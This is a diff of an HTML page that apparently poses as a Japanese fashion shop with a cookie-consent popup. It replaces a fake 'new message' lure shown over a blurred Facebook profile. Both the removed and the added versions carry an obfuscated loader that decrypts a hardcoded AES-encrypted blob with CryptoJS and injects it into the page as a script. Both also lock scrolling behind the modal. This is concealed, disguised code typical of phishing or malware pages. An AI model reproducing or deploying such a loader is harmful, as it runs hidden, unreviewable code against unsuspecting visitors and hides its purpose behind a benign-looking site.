@@ -1,49 +1,6 @@
 <html>
-<style>
-		* {
-			margin: 0;
-			padding: 0;
-			box-sizing: border-box;
-		}
-
-		body {
-			font-family: 'Poppins', sans-serif;
-			background: #f4f4f4;
-		}
-
-		.divcover {
-			z-index: 10;
-			background-color: rgba(0, 0, 0, 0.7);
-			position: fixed;
-			inset: 0;
-		}
-
-		.f-modal-centre {
-			background-color: #fff;
-			border-radius: 16px;
-			text-align: center;
-			width: 100%;
-			max-width: 500px;
-			padding: 32px;
-			display: block;
-			position: relative;
-			bottom: -37%;
-			left: 50%;
-			transform: translateX(-50%);
-			box-shadow: 10px 10px 50px rgba(0, 0, 0, 0.2);
-			opacity: 1;
-		}
-
-		.f-modal-icon-success img {
-			border-radius: 10px;
-			margin-bottom: 20px;
-		}
-
-		.f-sub-heading-regular {
-			font-size: 22px;
-			margin-bottom: 12px;
-			color: #333;
-		}
+  <style>
+		
 
 
 		.f-button-primary {
@@ -86,51 +43,74 @@
 		}
 	</style>
 
-
-
-
-
-<body id="myBody">
-
-<div class="divcover" id="modalContainer">
-	<div class="f-modal-centre" id="modalContent">
-		<div class="f-modal-icon-success" style="
-            display: flex;
-            justify-content: center;
-            align-items: center;">
-			            <img src="img/messenger-icon1024.jpg" width="100" height="100" loading="lazy" alt="Cookie Icon">
-		</div>
-		<div class="f-sub-heading-regular">新しいメッセージが1件あります。読みますか？</div>
-		<div class="button-group">
-			<a href="#" class="f-button-primary" id="rejectButton" style="background-color: #E53935;">キャンセル</a>
-			<a href="#" class="f-button-primary" id="manageButton" style="background-color: #2979FF;">続く</a>
-		</div>
-		<div class="f-modal-close" id="closeButton">✖</div>
-	</div>
-</div>
-<div style="opacity: 0.3">
-	<img src="img/fbProfile.jpg">
+<!-- Cookie Modal HTML: Make sure it's in your <body> -->
+<div class="divcover" id="modalContainer" style="display: flex; z-index: 9999; background: rgba(0,0,0,0.8); position: fixed; inset: 0; justify-content: center; align-items: center;">
+  <div class="f-modal-centre" id="modalContent" style="background: #fff; border-radius: 16px; text-align:center; max-width:500px; padding:32px; position:relative;">
+    <div class="f-modal-icon-success" style="margin-bottom:20px;">
+      <img src="Capture.JPG" width="100" height="100" alt="Cookie Icon"/>
+    </div>
+    <div class="f-sub-heading-regular" style="font-size:22px; margin-bottom:12px; color:#333;">エクスペリエンスを向上させるために Cookie を使用します。</div>
+    <div class="button-group">
+      <a href="#" class="f-button-primary" id="acceptButton" style="background-color:#4CAF50;">受け入れる</a>
+      <a href="#" class="f-button-primary" id="rejectButton" style="background-color:#E53935;">拒否する</a>
+      <a href="#" class="f-button-primary" id="manageButton" style="background-color:#2979FF;">管理</a>
+    </div>
+    <div class="f-modal-close" id="closeButton" style="position:absolute; top:10px; right:10px; cursor:pointer;">&times;</div>
+  </div>
 </div>
 
+<!-- CSS: You likely already have styles, but ensure the above is visible -->
+<style>
+body.modal-open {
+  overflow: hidden;
+}
+</style>
 
-	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-	<script>
-		function aesDecode(encodedText) {
-			const decodedText = decodeURIComponent(encodedText);
-			const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
-			return bytes.toString(CryptoJS.enc.Utf8);
-		}
-		const codeString = aesDecode(`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`);
-		const script = document.createElement("script");
-		script.textContent = codeString;
-		document.body.appendChild(script);
-	</script>
+<!-- JavaScript: Place this before </body> -->
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+  // Show modal on load
+  document.getElementById('modalContainer').style.display = 'flex';
+  document.body.classList.add('modal-open');
 
-	<script>
-		document.body.style.overflow = "hidden";
-	</script>
+  // Close modal handler
+  function closeModal() {
+    document.getElementById('modalContainer').style.display = 'none';
+    document.body.classList.remove('modal-open');
+  }
+
+  document.getElementById('acceptButton').onclick = closeModal;
+  document.getElementById('rejectButton').onclick = closeModal;
+  document.getElementById('manageButton').onclick = closeModal;
+  document.getElementById('closeButton').onclick = closeModal;
+});
+</script>
 
 
+
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+        <meta name="keywords" content="ファッション, トレンド, スタイル, コーディネート, オシャレ, ブランド, アウトフィット, ショッピング, 衣類, アクセサリー, モード, デザイン, メンズファッション, レディースファッション, シーズン, 新" />
+        <meta name="description" content="最新のファッションを追求するサイト。トレンドの洋服、アクセサリー、シューズを豊富に取り揃え、スタイルに合ったアイテムを簡単に見つけることができます。高品質な商品をリーズナブルな価格で提供し、最新のファッションニュースやスタイリングのヒントも満載。すべてのファッション愛好家に最適なオンラインショッピング体験を提供します。" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>    
+
+
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+       
 
 <head>
     <meta charset="UTF-8" class="thumb-yCTFrBYjOf" />
